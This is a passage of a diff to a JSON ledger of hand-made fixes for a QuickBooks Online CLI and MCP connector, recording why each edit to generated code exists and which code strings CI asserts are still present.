@@ -1,768 +1,1788 @@
 {
- "slug": "quickbooks",
- "doc": "docs/reprint-survival.md",
- "_comment": "Connector-specific edits to GENERATED files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present and fails CI if a reprint dropped one. status: active = connector-only, a reprint would clobber it; upstreamed = also fixed in the press but the back-port must still be present today.",
- "handfixes": [
-  {
-   "id": "qbo-query-injection",
-   "summary": "sync injects `select * from <Entity>` (+ minorversion) for the /query endpoint; QBO has no plain REST list path",
-   "why": "Every QuickBooks Online entity is read through /query, which REQUIRES a SQL-like `query` parameter. The generated sync path sent a bare /query with no query text, and QBO answers HTTP 200 with a `{\"Fault\":...SystemFailureError}` envelope (not a 4xx). The generic extractor finds no array, so upsertSingleObject gets the Fault envelope, extractObjectID returns \"\", and every resource fails with `missing id for <resource>` (0 rows). Fix injects a per-entity `select * from <Entity> ...` and `minorversion=75` when path==\"/query\", mapping each sync resource to its PascalCase QBO entity.",
-   "status": "active",
-   "spec_encode_followup": "Press change: teach cli-printing-press to inject the entity SQL + minorversion for QBO-shaped /query endpoints via a sync-hint / x-pp-query spec extension, so a reprint regenerates this by construction. File via /printing-press-retro.",
-   "asserts": [
+  "slug": "quickbooks",
+  "doc": "docs/reprint-survival.md",
+  "_comment": "Connector-specific edits to GENERATED files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present and fails CI if a reprint dropped one. status: active = connector-only, a reprint would clobber it; upstreamed = also fixed in the press but the back-port must still be present today.",
+  "handfixes": [
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "quickbooksEntity",
-     "min_count": 2
+      "id": "qbo-query-injection",
+      "summary": "sync injects `select * from <Entity>` (+ minorversion) for the /query endpoint; QBO has no plain REST list path",
+      "why": "Every QuickBooks Online entity is read through /query, which REQUIRES a SQL-like `query` parameter. The generated sync path sent a bare /query with no query text, and QBO answers HTTP 200 with a `{\"Fault\":...SystemFailureError}` envelope (not a 4xx). The generic extractor finds no array, so upsertSingleObject gets the Fault envelope, extractObjectID returns \"\", and every resource fails with `missing id for <resource>` (0 rows). Fix injects a per-entity `select * from <Entity> ...` and `minorversion=75` when path==\"/query\", mapping each sync resource to its PascalCase QBO entity.",
+      "status": "active",
+      "spec_encode_followup": "Press change: teach cli-printing-press to inject the entity SQL + minorversion for QBO-shaped /query endpoints via a sync-hint / x-pp-query spec extension, so a reprint regenerates this by construction. File via /printing-press-retro.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "quickbooksEntity",
+          "min_count": 2
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "\"minorversion\"",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "\"JournalEntry\"",
+          "min_count": 1
+        }
+      ]
     },
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "\"minorversion\"",
-     "min_count": 1
+      "id": "qbo-query-paging",
+      "summary": "sync pages QBO /query via in-query STARTPOSITION/MAXRESULTS until a short page; without it the mirror truncates at 1000 rows/entity",
+      "why": "resourceSupportsPagination() is false for every QBO entity, so the generic sync loop breaks after page 1 - capping each entity at one 1000-row page (QBO's MAXRESULTS hard cap). On a real book this silently truncated catastrophically: only the first 1000 rows of each entity, making ar-aging/ap-aging/dso/balances wrong (not just partial), and QBO returns rows oldest-first so recent invoices were missing entirely. Fix carries the next STARTPOSITION in the loop's `cursor`, sets hasMore from full-page detection (len(items) >= qboMaxResults), and exempts /query from the generic !resourceSupportsPagination and short-page breaks. Verified live against a production tenant: all 8 resources sync to their exact live count(*) across the full book.",
+      "status": "active",
+      "spec_encode_followup": "Same press change as qbo-query-injection: a QBO sync-hint that emits STARTPOSITION/MAXRESULTS paging by construction.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "qboMaxResults",
+          "min_count": 2
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "startposition %d maxresults %d",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "path != \"/query\"",
+          "min_count": 2
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "qboStartPosition(cursor)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "truncatedByCap := (resourceSupportsPagination(resource) || path == \"/query\") && hasMore",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/qbo_sync_paging_test.go",
+          "contains": "func TestQBOSyncPagesThroughTheWholeBook(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
     },
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "\"JournalEntry\"",
-     "min_count": 1
+      "id": "qbo-queryresponse-envelope",
+      "summary": "page-item extraction unwraps QBO's two-level `{\"QueryResponse\":{\"<Entity>\":[...]}}` envelope",
+      "why": "QBO /query nests the result array one level deeper than the generic extractor handles: `QueryResponse` (object) then the PascalCase entity key (array). Without `QueryResponse` in dataEnvelopeKeys, extractPageItems cannot reach the entity array, returns 0 items, and sync falls through to single-object upsert of the whole envelope. Adding it lets the existing two-level unwrap + single-array-sibling logic pull the entity array correctly. Paired with qbo-query-injection; both are required for sync to store any rows.",
+      "status": "active",
+      "spec_encode_followup": "Same press change as qbo-query-injection: a QBO response-envelope hint so the generated extractor unwraps QueryResponse.<Entity> by construction.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "\"QueryResponse\"",
+          "min_count": 1
+        }
+      ]
+    },
+    {
+      "id": "qbo-db-path-env",
+      "summary": "defaultDBPath and MCPStorePath honor QUICKBOOKS_DB_PATH so sandbox and production keep separate local mirrors, and the MCP server reads the file the CLI sync wrote",
+      "why": "The local SQLite mirror path was hardcoded to ~/.local/share/quickbooks-cli/data.db with no per-tenant separation. QBO entity IDs are per-company and collide across companies (sandbox Id \"58\" vs production Id \"58\"), so running both sandbox and production against one data.db corrupts aggregates after a mode switch. The Keychain wrapper sets QUICKBOOKS_DB_PATH per mode (.../sandbox/data.db vs .../production/data.db); this env override makes every command (sync, doctor, the aggregates) honor it.",
+      "status": "active",
+      "spec_encode_followup": "Press change: a generic <CLI>_DB_PATH env override on defaultDBPath would let any multi-tenant connector isolate mirrors without a hand-edit.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/helpers.go",
+          "contains": "QUICKBOOKS_DB_PATH",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/helpers.go",
+          "contains": "cliutil.EnvOverride(\"QUICKBOOKS_DB_PATH\")",
+          "min_count": 2,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-aging-snapshots-table",
+      "summary": "aging-delta creates its aging_snapshots table on demand; no store migration defines it",
+      "why": "aging_delta.go (a novel hand-authored command) reads and writes an aging_snapshots table, but nothing in the store migrations creates it. So every aging-delta run errored `no such table: aging_snapshots` on the read path (loadLatestAgingSnapshot treats only sql.ErrNoRows as a clean first-run; a missing table is a hard error) - the command was broken from first use. Fix adds ensureAgingSnapshotsTable (CREATE TABLE IF NOT EXISTS) called before the read, so a fresh or freshly reprinted DB self-heals. aging_delta.go is a novel file kept whole by regen-merge, so this survives a reprint; this entry is the cheap backstop the reprint-survival doc recommends for novel commands.",
+      "status": "active",
+      "spec_encode_followup": "Press change: novel commands that own a private table should declare it in the store migration set so it is created by construction.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/aging_delta.go",
+          "contains": "CREATE TABLE IF NOT EXISTS aging_snapshots",
+          "min_count": 1
+        }
+      ]
+    },
+    {
+      "id": "qbo-report-reports-api",
+      "summary": "report pnl, report balance-sheet and report cash-flow pull QBO financial statements (P&L, Balance Sheet, Statement of Cash Flows) from the Reports API, which the /query-based CLI cannot reach; every report takes --columns total|month|quarter, keeps the full row tree and offers --raw",
+      "why": "QuickBooks financial statements live behind the Reports API (/reports/ProfitAndLoss, /reports/BalanceSheet, /reports/CashFlow), not /query, so the generated CLI could not produce them. report.go is a novel hand-authored command group (report pnl, report balance-sheet, report cash-flow; all mcp:read-only) kept whole by regen-merge, but its registration in the generated root.go (rootCmd.AddCommand(newReportCmd(flags))) is a hand-edit a reprint would clobber. Issues #491 and #493 added report cash-flow (operating, investing and financing totals, net cash change, beginning and ending cash, null when the report has no such line), --columns (summarize_column_by Total|Month|Quarter with per-column amounts and column titles from the report's Columns), the row tree (every header, line and total with id, kind, depth and parent, so a group total is told apart from a leaf and QBO's layout can be rebuilt) and --raw (QuickBooks' Header/Columns/Rows JSON through the client's normal answer path and output check). The existing accounts, summaries and metrics fields are unchanged. TestReportRowTreeKeepsTheLayout, TestReportCashFlowReturnsSectionsAndCashPosition, TestReportColumnsFlagMapsToSummarizeColumnBy, TestReportRawPassesTheAnswerThrough and TestMCPReportToolsAreReadOnly were each seen failing first (.review/seen/qb491-493-report-fail-first.txt).",
+      "status": "active",
+      "spec_encode_followup": "Press change: encode the report command group in the QBO spec (or a novel-feature manifest) so root.go registers it by construction without a hand-edit.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "newReportCmd(flags)",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "/reports/ProfitAndLoss",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "/reports/BalanceSheet",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "\"/reports/CashFlow\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "cmd.AddCommand(newReportCashFlowCmd(flags))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "params[\"summarize_column_by\"] = columnsBy",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "func flattenReport(rows qbRows, ncols int) []reportRow {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "`json:\"depth\"`",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "`json:\"parent\"`",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "`json:\"kind\"`",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "flattenReport(rep.Rows, len(columns))",
+          "min_count": 3,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "cmd.Flags().BoolVar(&rf.raw, \"raw\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "return rep, true, flags.printJSON(cmd, json.RawMessage(data))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report.go",
+          "contains": "rf.register(cmd)",
+          "min_count": 3,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report_tree_test.go",
+          "contains": "func TestReportRowTreeKeepsTheLayout(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/report_tree_test.go",
+          "contains": "func TestReportCashFlowReturnsSectionsAndCashPosition(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_kit_classes_e2e_test.go",
+          "contains": "func TestQBORawReportThatRepeatsTheTokenIsWithheld(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/qbo_report_tools_test.go",
+          "contains": "func TestMCPReportToolsAreReadOnly(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "doctor-verdict-tracks-reality",
+      "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
+      "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/doctor_verdict.go",
+          "contains": "func doctorProbeCredentials("
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "doctorIsInfoKey(k)"
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "doctorProbeCredentials(cmd.Context()"
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "not_contains": "present, not verified. Run `%s %s`"
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "not_contains": "for _, v := range report {"
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/doctor_verdict.go",
+          "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/doctor.go",
+          "contains": "if cfg != nil && (doctorBaseURLIsPlaceholder(cfg.BaseURL) || doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)) {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "install-credentials-declared-on-every-channel",
+      "summary": "every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)",
+      "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For quickbooks the manifest gained: QUICKBOOKS_BASE_URL, QUICKBOOKS_CLIENT_ID, QUICKBOOKS_CLIENT_SECRET, QUICKBOOKS_ENVIRONMENT, QUICKBOOKS_REALM_ID, QUICKBOOKS_REFRESH_TOKEN, QUICKBOOKS_TOKEN_URL. server.json gained: QUICKBOOKS_BASE_URL, QUICKBOOKS_CLIENT_ID, QUICKBOOKS_CLIENT_SECRET, QUICKBOOKS_ENVIRONMENT, QUICKBOOKS_REALM_ID, QUICKBOOKS_REFRESH_TOKEN, QUICKBOOKS_TOKEN_URL. mcp-install.md's env blocks gained: QUICKBOOKS_BASE_URL, QUICKBOOKS_CLIENT_ID, QUICKBOOKS_CLIENT_SECRET, QUICKBOOKS_ENVIRONMENT, QUICKBOOKS_REALM_ID, QUICKBOOKS_REFRESH_TOKEN, QUICKBOOKS_TOKEN_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.",
+      "status": "active",
+      "spec_encode_followup": "cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.",
+      "asserts": [
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_ACCESS_TOKEN\": \"${user_config.quickbooks_access_token}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_BASE_URL\": \"${user_config.quickbooks_base_url}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_CLIENT_ID\": \"${user_config.quickbooks_client_id}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_CLIENT_SECRET\": \"${user_config.quickbooks_client_secret}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_ENVIRONMENT\": \"${user_config.quickbooks_environment}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_REALM_ID\": \"${user_config.quickbooks_realm_id}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_REFRESH_TOKEN\": \"${user_config.quickbooks_refresh_token}\"",
+          "min_count": 1
+        },
+        {
+          "file": "manifest.json",
+          "contains": "\"QUICKBOOKS_TOKEN_URL\": \"${user_config.quickbooks_token_url}\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_ACCESS_TOKEN\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_BASE_URL\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_CLIENT_ID\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_CLIENT_SECRET\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_ENVIRONMENT\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_REALM_ID\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_REFRESH_TOKEN\"",
+          "min_count": 1
+        },
+        {
+          "file": "server.json",
+          "contains": "\"name\": \"QUICKBOOKS_TOKEN_URL\"",
+          "min_count": 1
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_ACCESS_TOKEN\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_BASE_URL\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_CLIENT_ID\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_CLIENT_SECRET\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_ENVIRONMENT\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_REALM_ID\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_REFRESH_TOKEN\":",
+          "min_count": 3
+        },
+        {
+          "file": "mcp-install.md",
+          "contains": "\"QUICKBOOKS_TOKEN_URL\":",
+          "min_count": 3
+        }
+      ]
+    },
+    {
+      "id": "novel-acceptance-fixtures-relative-to-today",
+      "summary": "The novel-command acceptance fixtures seed every QBO date as a whole-day offset from the day the test runs, not as an absolute 2026 date, so the seeded books keep the same shape on any future date",
+      "why": "seedNovelStore hard-coded absolute dates (INV-1 due 2026-04-30, INV-2 due 2026-07-15, BILL-1 due 2026-06-20) while the commands under test read the wall clock: the Cobra layer passes time.Now() into analytics.CashForecast, analytics.StaleInvoices and analytics.Aging. Those fixtures encoded a 'today' of roughly 2026-05, so the assertions only held for a 75-day window. Once the calendar passed 2026-07-15 every seeded invoice was overdue, and both TestNovelCashForecastAcceptance (overdue_inflows 800 instead of 500, an empty 8-week window, net_in_window 0) and TestNovelInvoicesStaleAcceptance (INV-2 joined the collections list) failed on the calendar rather than on a code change. This is a TEST defect, not a product one - the shipped commands correctly forecast from the real current date, and the analytics layer already takes an injected `now` that its own unit tests pin. The fix moves the fixtures onto that same footing: novelSeedDay() reads the clock exactly once and seedDate() renders integer day offsets from it, so the books are translation-invariant. The reference day is anchored in UTC even though its year/month/day come from the local clock, because AddDate over a local midnight that does not exist on a spring-forward day (America/Santiago, Asia/Beirut) normalizes back to 23:00 the previous day and would slip every derived date by one. Offsets were chosen to clear every bucket, window and overdue boundary by a wide margin, because fixture dates parse as UTC midnight while the commands floor 'today' in local time - a skew of up to 14 hours. Proven both directions across 658800 (reference-day, time-zone, hour) combinations spanning 2026-2045 over 15 zones including the DST-hostile ones: 0 failures with the relative fixtures, and the same sweep run against the old absolute fixtures fails on 7245 of 7320 reference days, so the check discriminates rather than passing by construction. The tests also got stronger on the way through: the pinned reference lets them assert overdue_outflows, the beyond-window split, net_in_window and which forward week each open item buckets into, none of which could be asserted while 'today' was unknown. The as_of assertion brackets the command with two clock reads (dayBefore before the run, dayAfter after it) and requires dayBefore <= as_of <= dayAfter, both bounds inclusive: flooring to whole days is monotonic over the ordered reads t0 <= t1 <= t2, so a midnight crossing on either side of the command is admitted while a genuinely stale or future as_of still fails.",
+      "status": "active",
+      "spec_encode_followup": "Press-side: the acceptance-test template should seed clock-relative dates for any connector whose novel commands take a `now`, rather than emitting absolute date literals that rot. Worth noting for the same retro: no local novel command exposes an --as-of / reference-date flag (only `report balance-sheet` has one), so a caller cannot reproduce a cash-forecast or aging run as of a past date. Adding one is a product change and is deliberately NOT part of this fix.",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/novel_acceptance_test.go",
+          "contains": "func novelSeedDay() time.Time {",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/novel_acceptance_test.go",
+          "contains": "func seedDate(ref time.Time, offsetDays int) string {",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/novel_acceptance_test.go",
+          "contains": "seedDate(ref, inv1DueOff)",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/novel_acceptance_test.go",
+          "contains": "net_in_window",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/novel_acceptance_test.go",
+          "contains": "if asOf < dayBefore || asOf > dayAfter {",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/novel_prior_acceptance_test.go",
+          "contains": "days_past_due",
+          "min_count": 1
+        }
+      ]
+    },
+    {
+      "id": "mcp-executor-request-contracts",
+      "summary": "MCP discovery exposes executor-facing request schemas and indexes input names and known enum values",
+      "why": "Issue #351: endpoint summaries omitted required request inputs. Keep canonical JSON body case and nesting, path/header/query routing, and exact short request search terms. Contracts are derived from the shipped CLI source, and the existing CLI commands and auth remain intact. Upstream request metadata fix #4890 was not merged when this surgical repair was made.",
+      "status": "active",
+      "spec_encode_followup": "Replace this downstream contract extraction only when a released Printing Press generates equally complete executor-facing schemas and preserves every existing hand-fix.",
+      "asserts": [
+        {
+          "file": "cli/internal/mcp/code_orch.go",
+          "contains": "\"params_schema\":",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/code_orch.go",
+          "contains": "codeOrchRequestScore(ep, query)",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/code_orch.go",
+          "contains": "codeOrchResolveContract(ep, ep.Path, params)",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/code_orch.go",
+          "contains": "codeOrchHasBody(ep)",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/request_contract.go",
+          "contains": "func loadRequestContracts()",
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/request_contracts.json",
+          "contains": "\"properties\""
+        }
+      ]
+    },
+    {
+      "id": "qbo-realm-env-base-url",
+      "class": "generated-edit",
+      "summary": "config.go composes the company base URL from QUICKBOOKS_REALM_ID and QUICKBOOKS_ENVIRONMENT (production or sandbox) when QUICKBOOKS_BASE_URL is unset; the realm is path-escaped and an unresolved bundle placeholder is ignored",
+      "why": "QuickBooks Online serves every company under /v3/company/<realm>, so the press's single base URL default is a placeholder. Without this edit an operator who set only the realm ID (the .mcpb prompt) dialled the placeholder. It was an unrecorded edit since press 4.24.0 and is now ledgered so a reprint cannot drop it.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "cliutil.EnvOverride(\"QUICKBOOKS_REALM_ID\")",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "\"/v3/company/\" + url.PathEscape(realm)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "} else if base := qboRealmBaseURL(); base != \"\" {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-auth-refresh-registered",
+      "class": "generated-edit",
+      "summary": "auth.go registers the hand-written `auth refresh` command",
+      "why": "auth_refresh.go is a hand file; without this one line in the generated auth.go the command compiles but is unreachable, and an operator with a refresh token has no way to mint an access token.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/auth.go",
+          "contains": "cmd.AddCommand(newAuthRefreshCmd(flags))",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-dupes-literal-registration",
+      "class": "generated-edit",
+      "summary": "root.go registers `dupes` with a literal rootCmd.AddCommand instead of addNovelCommandIfAbsent",
+      "why": "dogfood's command walker does not follow addNovelCommandIfAbsent, so it matched `dupes customers` against the root `customers` resource and reported the novel command missing. A literal registration keeps the surface checks truthful.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "rootCmd.AddCommand(newNovelDupesCmd(flags))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "not_contains": "addNovelCommandIfAbsent(rootCmd, newNovelDupesCmd(flags))"
+        }
+      ]
+    },
+    {
+      "id": "qbo-empty-query-response",
+      "class": "generated-edit",
+      "summary": "sync treats QuickBooks' empty result {\"QueryResponse\":{}} as the end of the entity, while a Fault beside it still fails the resource",
+      "why": "QuickBooks answers a query with no rows as an empty QueryResponse object: an entity with no records, and the page after a book whose size is an exact multiple of 1000. Before this edit sync failed that resource with \"missing id\" on every run. Tests TestQBOSyncEndsCleanlyOnAnEmptyQueryResponse and TestQBOSyncFailsOnAFault pin both directions.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "func qboEmptyQueryResponse(data json.RawMessage) bool {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/sync.go",
+          "contains": "|| (path == \"/query\" && qboEmptyQueryResponse(data))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/qbo_sync_paging_test.go",
+          "contains": "func TestQBOSyncEndsCleanlyOnAnEmptyQueryResponse(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/qbo_sync_paging_test.go",
+          "contains": "func TestQBOSyncFailsOnAFault(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "qbo-auth-refresh-token-guards",
+      "class": "hand-file",
+      "summary": "auth refresh sends the client secret and refresh token only over https (or plain http to loopback), never follows a redirect, and shows only the status and an RFC 6749 error code from a failed token answer",
+      "why": "The refresh grant carries both long-lived OAuth credentials. A plaintext or redirected token URL would hand them to another host, and an echoed body can arrive in an encoding no detector decodes, so the answer is allowlisted. Each test was seen failing on the earlier auth_refresh.go. Issue #492 moved the client id, client secret and refresh token resolution into client.QBORefreshCredentials (internal/client/qbo_token_refresh.go), which `auth refresh`, every command and the MCP server share; it still reads them through cliutil.EnvOverride, so an unresolved bundle placeholder counts as unset.",
+      "status": "active",
+      "asserts": [
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "func refuseInsecureTokenURL(raw string) error {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "return http.ErrUseLastResponse",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "func tokenEndpointError(status int, body []byte) error {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh.go",
+          "contains": "cliutil.EnvOverride(\"QUICKBOOKS_TOKEN_URL\")",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh_test.go",
+          "contains": "func TestRefreshAccessTokenRefusesPlaintextRemoteTokenURL(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh_test.go",
+          "contains": "func TestRefreshAccessTokenDoesNotFollowRedirects(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/auth_refresh_test.go",
